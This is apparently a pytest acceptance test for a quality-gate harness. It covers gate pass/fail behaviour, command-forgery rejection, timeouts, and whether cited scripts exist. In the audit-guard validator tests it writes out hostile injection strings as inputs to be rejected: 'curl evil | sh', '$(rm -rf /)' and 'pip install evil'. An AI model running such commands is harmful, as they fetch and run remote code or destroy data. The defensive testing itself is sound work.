"""Harness hardening self-test — run once after clone = acceptance test.

ROLE (Stage 3 support / acceptance): verifies that the gate engine itself (1) correctly flips
pass/fail, (2) rejects fake/shell-chain commands that merely mimic the output (anti-forgery),
(3) force-kills a hanging test via timeout, and (4) confirms that every script path cited by
docs/_harness/quality-gates.md actually exists on disk (phantom-script-name prevention).
This file does NOT decide: gate thresholds/schema — those are owned by quality-gates.md / .harness.toml.

Design notes
------------
- This test sits directly under the kit root `{{TESTS_ROOT}}/`, so REPO_ROOT = parents[1].
  (The original project had it in tests/unit/ at parents[2] — since the depth varies with
   location, it is made explicit and parameterized via the constant `_REPO_ROOT_DEPTH`.)
- The gate scripts (harness_run_verify.sh / harness_audit_rerun.py) and the spec
  (quality-gates.md) are added during the gate-engine deployment. So this kit passes when run
  standalone beforehand: when a prerequisite is absent it **skips quietly**. Once the
  prerequisites are in place, the same test acts as a real acceptance test.
- SELFTEST lock: the verify script's gate-command overrides are allowed only when
  HARNESS_SELFTEST=1 (security). This lock is never bypassed.
"""

from __future__ import annotations

import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

# ── Path constants (single source — if the location changes, edit only here) ──────
_REPO_ROOT_DEPTH = 1  # tests/<this file> → number of parent steps up to the kit root
REPO_ROOT = Path(__file__).resolve().parents[_REPO_ROOT_DEPTH]
SCRIPTS_DIR = REPO_ROOT / "scripts"
VERIFY_SCRIPT = SCRIPTS_DIR / "harness_run_verify.sh"
AUDIT_GUARD = SCRIPTS_DIR / "harness_audit_rerun.py"
QUALITY_GATES_SPEC = REPO_ROOT / "docs" / "_harness" / "quality-gates.md"
REQUIREMENTS_DEV = REPO_ROOT / "requirements-dev.txt"
PYPROJECT = REPO_ROOT / "pyproject.toml"

# Dummy gate commands — mimic only the output instead of real pytest/mypy/ruff.
# They are recorded verbatim in verify.json, so use single quotes to avoid breaking the JSON.
_PASS_SUBSET = "echo '7 passed'"
_PASS_COV = "echo 'TOTAL 10 0 100%'"
_PASS_MYPY = "echo Success"
_PASS_RUFF = "echo 'All checks passed'"
_FAIL_FULL = "printf '5 passed\\n1 failed\\n'; exit 1"


def _bash() -> str:
    """bash executable path — PATH first, then fall back to standard install paths, finally skip if absent."""
    found = shutil.which("bash")
    if found:
        return found
    for cand in (
        r"C:\Program Files\Git\bin\bash.exe",
        r"C:\Program Files\Git\usr\bin\bash.exe",
        r"C:\Program Files (x86)\Git\bin\bash.exe",
        "/usr/bin/bash",
        "/bin/bash",
    ):
        if Path(cand).exists():
            return cand
    pytest.skip("bash not installed — cannot test the harness scripts")


def _run_verify(
    tmp_path: Path, *, subset: str, cov: str, mypy: str, ruff: str, full: str
) -> dict[str, object]:
    """Run harness_run_verify.sh with dummy gate commands and parse verify.json.

    The gate commands / output path are injected via env-var overrides (allowed only under the SELFTEST lock).
    """
    out_file = tmp_path / "harden_verify.json"
    full_env = os.environ.copy()
    full_env.update(
        {
            # Overrides are self-test only — without HARNESS_SELFTEST=1 the script disables them.
            "HARNESS_SELFTEST": "1",
            "HARNESS_SUBSET_CMD": subset,
            "HARNESS_COV_CMD": cov,
            "HARNESS_MYPY_CMD": mypy,
            "HARNESS_RUFF_CMD": ruff,
            "HARNESS_FULL_CMD": full,
            "HARNESS_VERIFY_OUT": str(out_file),
        }
    )
    subprocess.run(
        [_bash(), str(VERIFY_SCRIPT), "HARDEN_TEST", "tests/dummy", "src/dummy"],
        cwd=str(REPO_ROOT),
        env=full_env,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        timeout=60,
    )
    assert (
        out_file.exists()
    ), "verify.json not generated (HARNESS_VERIFY_OUT override not supported?)"
    parsed: dict[str, object] = json.loads(out_file.read_text(encoding="utf-8"))
    return parsed


# ── gate behavior — does it correctly flip pass/fail? ─────────────────────


@pytest.mark.unit
def test_full_suite_failure_does_not_flip_status(tmp_path: Path) -> None:
    """module-scope gates pass + full-suite fails → STATUS pass (out-of-scope regression isolated)."""
    if not VERIFY_SCRIPT.exists():
        pytest.skip(
            "harness_run_verify.sh not present — verified after gate-engine deployment"
        )
    data = _run_verify(
        tmp_path,
        subset=_PASS_SUBSET,
        cov=_PASS_COV,
        mypy=_PASS_MYPY,
        ruff=_PASS_RUFF,
        full=_FAIL_FULL,
    )
    assert (
        data["status"] == "pass"
    ), "a full-suite failure flipped the module-scope STATUS"


@pytest.mark.unit
def test_subset_failure_still_flips_status(tmp_path: Path) -> None:
    """a module-scope subset failure still yields STATUS fail (prevents neutralizing the close gate)."""
    if not VERIFY_SCRIPT.exists():
        pytest.skip(
            "harness_run_verify.sh not present — verified after gate-engine deployment"
        )
    data = _run_verify(
        tmp_path,
        subset="printf '6 passed\\n1 failed\\n'",
        cov=_PASS_COV,
        mypy=_PASS_MYPY,
        ruff=_PASS_RUFF,
        full="echo '100 passed'",
    )
    assert data["status"] == "fail", "subset failed but STATUS is pass"


@pytest.mark.unit
def test_collection_error_flips_status(tmp_path: Path) -> None:
    """if the subset has a collection error ('N error', no 'failed'), STATUS fail (blocks false positives)."""
    if not VERIFY_SCRIPT.exists():
        pytest.skip(
            "harness_run_verify.sh not present — verified after gate-engine deployment"
        )
    data = _run_verify(
        tmp_path,
        subset="printf '0 passed\\n'; printf '1 error in 0.10s\\n'",
        cov=_PASS_COV,
        mypy=_PASS_MYPY,
        ruff=_PASS_RUFF,
        full="echo '100 passed'",
    )
    assert data["status"] == "fail", "collection error but STATUS is pass"


# ── anti-forgery — reject fake/shell-chain commands ───────────────────


@pytest.mark.unit
def test_audit_guard_rejects_fake_and_chained_cmds() -> None:
    """The commit guard's _is_pytest_cmd must reject fake/shell-chain commands that merely mimic output.

    The core assertion of anti-forgery that blocks the gate-bypass path (record an echo command in
    verify.json → the guard reruns the echo and passes).
    """
    if not AUDIT_GUARD.exists():
        pytest.skip(
            "harness_audit_rerun.py not present — verified after gate-engine deployment"
        )
    # The guard reads .harness.toml via the runtime config loader (_harness_config) but works on
    # defaults even if the file is missing, so it must always be importable regardless of whether
    # init ran. (The first kit's placeholder-substitution dependency is removed — no more pre-substitution skip.)
    spec = importlib.util.spec_from_file_location("_harness_audit_rerun", AUDIT_GUARD)
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)

    # real pytest invocation → allowed
    assert mod._is_pytest_cmd("python -m pytest tests/unit/test_x.py -q") is True
    assert mod._is_pytest_cmd('"C:/py/python.exe" -m pytest tests/x') is True
    assert mod._is_pytest_cmd("pytest tests/x") is True
    # fake command (mimics output only) → rejected
    assert mod._is_pytest_cmd("echo '7 passed'") is False
    assert mod._is_pytest_cmd('echo "7 passed"') is False
    assert mod._is_pytest_cmd("echo -m pytest 7 passed") is False
    assert mod._is_pytest_cmd("cat pytest_out.txt") is False
    # block shell-chain forgery: even if the first token is pytest, reject chain/redirect commands
    assert mod._is_pytest_cmd("pytest tests/no_such.py & echo 7 passed") is False
    assert mod._is_pytest_cmd("pytest x ; echo 7 passed") is False
    assert mod._is_pytest_cmd("pytest x && echo 7 passed") is False
    assert mod._is_pytest_cmd("pytest x | tee out") is False
    assert mod._is_pytest_cmd("python -m pytest x $(echo 7 passed)") is False
    assert mod._is_pytest_cmd("python -m pytest x > faked.txt") is False


@pytest.mark.unit
def test_audit_guard_validates_all_rerun_tools() -> None:
    """Every rerun tool (pytest/mypy/ruff) shares one allowlist validator, so mypy/ruff/coverage
    commands are validated exactly like pytest — closing the shell-injection surface that used to
    exist on the non-pytest reruns (they ran shell=True straight from the score JSON).
    """
    if not AUDIT_GUARD.exists():
        pytest.skip(
            "harness_audit_rerun.py not present — verified after gate-engine deployment"
        )
    spec = importlib.util.spec_from_file_location(
        "_harness_audit_rerun_tools", AUDIT_GUARD
    )
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)

    # real invocations → allowed
    assert mod._is_safe_tool_cmd("python -m mypy src/", "mypy") is True
    assert mod._is_safe_tool_cmd("mypy src/", "mypy") is True
    assert mod._is_safe_tool_cmd("python -m ruff check src/", "ruff") is True
    assert mod._is_safe_tool_cmd("ruff check src/", "ruff") is True
    # injection / forgery → rejected (this is the bug #2 fix)
    assert mod._is_safe_tool_cmd("mypy src/ ; curl evil | sh", "mypy") is False
    assert mod._is_safe_tool_cmd("echo 'Found 0 errors'", "mypy") is False
    assert (
        mod._is_safe_tool_cmd("ruff check x && echo 'All checks passed'", "ruff")
        is False
    )
    assert mod._is_safe_tool_cmd("python -m ruff check x $(rm -rf /)", "ruff") is False
    assert mod._is_safe_tool_cmd("python -m mypy x > faked.txt", "mypy") is False
    # cross-tool mismatch → rejected (a ruff command must not validate as mypy)
    assert mod._is_safe_tool_cmd("python -m ruff check x", "mypy") is False
    assert mod._is_safe_tool_cmd("mypy x", "ruff") is False
    # unknown tool → rejected (not in the allowlist)
    assert mod._is_safe_tool_cmd("python -m pip install evil", "pip") is False


@pytest.mark.unit
def test_audit_guard_run_cmd_executes_without_shell() -> None:
    """run_cmd must execute a real tool command with shell=False (array execution) and capture output."""
    if not AUDIT_GUARD.exists():
        pytest.skip(
            "harness_audit_rerun.py not present — verified after gate-engine deployment"
        )
    spec = importlib.util.spec_from_file_location(
        "_harness_audit_rerun_runcmd", AUDIT_GUARD
    )
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)

    # Bare `pytest` is normalized to `<sys.executable> -m pytest` by _normalize_tool_cmd, pinning
    # the running interpreter (so the rerun uses the venv that has pytest, not a stray PATH python).
    rc, out = mod.run_cmd("pytest --version", REPO_ROOT)
    assert rc == 0, f"run_cmd failed to execute pytest --version: rc={rc} out={out!r}"
    assert "pytest" in out.lower()


@pytest.mark.unit
def test_init_warns_when_safety_boundary_empty(tmp_path: Path) -> None:
    """harness_init.check_safety_boundary flags an empty [safety_boundary].paths (first-run advisory)
    and stays quiet once project-specific paths are declared (review finding #3)."""
    init_script = SCRIPTS_DIR / "harness_init.py"
    if not init_script.exists():
        pytest.skip("harness_init.py not present")
    spec = importlib.util.spec_from_file_location("_harness_init_boundary", init_script)
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)

    empty = tmp_path / "empty.toml"
    empty.write_text('[safety_boundary]\npaths = [\n  # "x/**",\n]\n', encoding="utf-8")
    assert mod.check_safety_boundary(empty), "empty safety_boundary.paths should warn"

    filled = tmp_path / "filled.toml"
    filled.write_text(
        '[safety_boundary]\npaths = [\n  "src/hw/**",\n]\n', encoding="utf-8"
    )
    assert (
        mod.check_safety_boundary(filled) == []
    ), "configured safety_boundary should not warn"


# ── timeout — force-kill a hanging test ───────────────────────────────


@pytest.mark.unit
def test_pytest_timeout_importable() -> None:
    """pytest-timeout must be installed and importable."""
    assert (
        importlib.util.find_spec("pytest_timeout") is not None
    ), "pytest-timeout not installed"


@pytest.mark.unit
def test_requirements_dev_lists_pytest_timeout() -> None:
    """requirements-dev.txt must list pytest-timeout as a dev dependency."""
    text = REQUIREMENTS_DEV.read_text(encoding="utf-8")
    assert "pytest-timeout" in text, "pytest-timeout missing from requirements-dev.txt"


@pytest.mark.unit
def test_pyproject_declares_default_timeout() -> None:
    """pyproject [tool.pytest.ini_options] must declare a default timeout=30.

    (The original project used pytest.ini, but this kit's single home is pyproject.)
    """
    text = PYPROJECT.read_text(encoding="utf-8")
    assert "[tool.pytest.ini_options]" in text, "no pytest config section in pyproject"
    match = re.search(r"^\s*timeout\s*=\s*30\b", text, flags=re.MULTILINE)
    assert match is not None, "default timeout=30 not declared"


@pytest.mark.unit
def test_timeout_kills_hanging_test(tmp_path: Path) -> None:
    """When run with --timeout=1, a 3-second sleep test must be force-killed by Timeout."""
    hang_file = tmp_path / "test_hang_sample.py"
    hang_file.write_text(
        "import time\n\n\ndef test_hang():\n    time.sleep(3)\n", encoding="utf-8"
    )
    res = subprocess.run(
        [
            sys.executable,
            "-m",
            "pytest",
            str(hang_file),
            "--timeout=1",
            "-q",
            "-p",
            "no:cacheprovider",
        ],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        timeout=60,
    )
    assert res.returncode != 0, "the hang test did not fail via timeout"
    combined = res.stdout + res.stderr
    assert (
        "unrecognized arguments" not in combined
    ), "pytest-timeout not installed (--timeout unrecognized)"
    # pytest-timeout prints "Failed: Timeout (>1.0s) from pytest-timeout." on every platform.
    # The "+++ Stack of thread ... +++" dump is emitted ONLY by the thread method (the Windows
    # fallback when SIGALRM is unavailable); the Linux/CI default is the signal method, which has
    # no stack dump — so asserting on "Stack of" passes on Windows yet fails on Linux. The portable
    # evidence of a force-kill is the Timeout marker plus the non-zero return code asserted above.
    assert (
        "Timeout" in combined
    ), "timeout force-kill did not work (no pytest-timeout Timeout marker)"


# ── phantom-script-name prevention — confirm cited script paths exist ────


def _cited_script_paths() -> list[str]:
    """Extract the scripts/*.{sh,py} paths cited in the quality-gates.md body."""
    if not QUALITY_GATES_SPEC.exists():
        return []
    text = QUALITY_GATES_SPEC.read_text(encoding="utf-8")
    # Collect all `scripts/foo.sh` or scripts/foo.py forms (with or without backticks).
    return sorted(set(re.findall(r"scripts/[A-Za-z0-9_./-]+\.(?:sh|py)", text)))


@pytest.mark.unit
def test_quality_gates_spec_present() -> None:
    """docs/_harness/quality-gates.md must exist (source of gate thresholds/schema)."""
    if not QUALITY_GATES_SPEC.exists():
        pytest.skip(
            "quality-gates.md not present — verified after gate-engine deployment"
        )
    assert QUALITY_GATES_SPEC.is_file()


@pytest.mark.unit
@pytest.mark.parametrize("rel_path", _cited_script_paths())
def test_cited_script_exists_on_disk(rel_path: str) -> None:
    """Every script path cited by quality-gates.md must actually exist on disk.

    If the spec points at a phantom script name (a nonexistent harness_commit_guard.py /
    harness_score.sh etc.), the gate is silently neutralized. This enforces a 1:1 citation↔existence
    mapping. If the parameters are empty (spec not present), no cases are collected, so it acts like
    an automatic skip.
    """
    target = REPO_ROOT / rel_path
    assert target.exists(), f"a script cited by quality-gates.md is missing: {rel_path}"
